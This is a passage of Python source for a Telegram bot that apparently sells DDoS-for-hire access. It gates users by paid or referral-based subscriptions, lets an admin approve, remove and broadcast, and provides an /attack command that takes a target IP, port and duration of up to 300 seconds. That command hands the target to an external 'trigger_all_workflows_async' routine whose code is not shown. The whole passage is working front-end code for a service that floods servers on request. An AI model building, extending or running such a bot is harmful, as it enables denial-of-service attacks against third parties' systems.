async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return
    
    msg_text = " ".join(context.args)
    broadcast_msg = f"📢 **ADMIN ANNOUNCEMENT** 📢\n\n{msg_text}"
    
    count = 0
    # Send to all users currently in the approved list
    for user_id in list(approved_users.keys()):
        try:
            await context.bot.send_message(chat_id=user_id, text=broadcast_msg, parse_mode="Markdown")
            count += 1
            await asyncio.sleep(0.05) # Avoid hitting Telegram's flood limits
        except:
            continue
    
    await update.message.reply_text(f"✅ Broadcast sent to {count} users.")

async def reffer(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in used_referrals:
        await update.message.reply_text("❌ You already claimed a referral reward.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /reffer <referral_code>")
        return
    input_code = context.args[0]
    referrer_id = next((uid for uid, data in approved_users.items() if data['ref_code'] == input_code), None)
    if not referrer_id:
        await update.message.reply_text("❌ Invalid Code.")
        return
    if referrer_id == user_id:
        await update.message.reply_text("❌ You can't refer yourself.")
        return
    used_referrals.add(user_id)
    approve_user(user_id, NEW_USER_REWARD_DAYS)
    approve_user(referrer_id, REFERRER_BONUS_DAYS)
    await update.message.reply_text(f"✅ Code Accepted!\n🎁 You got {NEW_USER_REWARD_DAYS} day.\n🎊 Referrer got {REFERRER_BONUS_DAYS} days bonus.")

async def Myid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_approved(user_id):
        data = approved_users[user_id]
        expiry = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(data['expiry_time']))
        msg = f"✅ APPROVED\n🆔 {user_id}\n⏰ Expiry: {expiry}\n🎟️ Ref Code: `{data['ref_code']}`"
    else:
        msg = f"❌ NOT APPROVED\n🆔 {user_id}\n💡 Use a referral code to get access!"
    await update.message.reply_text(msg, parse_mode="Markdown")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_attack_running, attack_end_time, current_target
    if not is_approved(update.effective_user.id):
        await update.message.reply_text("❌ No active subscription.")
        return
    now = time.time()
    if is_attack_running and now < attack_end_time:
        rem = int(attack_end_time - now)
        await update.message.reply_text(f"⏳ Cooldown: {rem}s\n🎯 Target: {current_target}")
        return
    try:
        ip, port, time_int = context.args[0], context.args[1], int(context.args[2])
        if not (1 <= time_int <= 300):
            await update.message.reply_text("❌ Limit: 300s")
            return
    except:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return
    is_attack_running, attack_end_time, current_target = True, now + time_int, f"{ip}:{port}"
    await update.message.reply_text(f"🚀 ATTACK SENT\n🎯 {ip}:{port}\n⏰ {time_int}s")
    asyncio.create_task(execute_attack(update, ip, port, time_int))

async def execute_attack(update, ip, port, duration):
    global is_attack_running, current_target
    try:
        await trigger_all_workflows_async(ip, port, duration)
        await asyncio.sleep(duration)
        await update.message.reply_text(f"✅ FINISHED: {ip}:{port}")
    finally:
        is_attack_running, current_target = False, ""

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        uid, days = int(context.args[0]), int(context.args[1])
        approve_user(uid, days)
        await update.message.reply_text(f"✅ Approved {uid} for {days} days.")
    except: pass

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    try:
        uid = int(context.args[0])
        if uid in approved_users:
            del approved_users[uid]
            await update.message.reply_text(f"🗑️ User {uid} removed.")
    except: pass

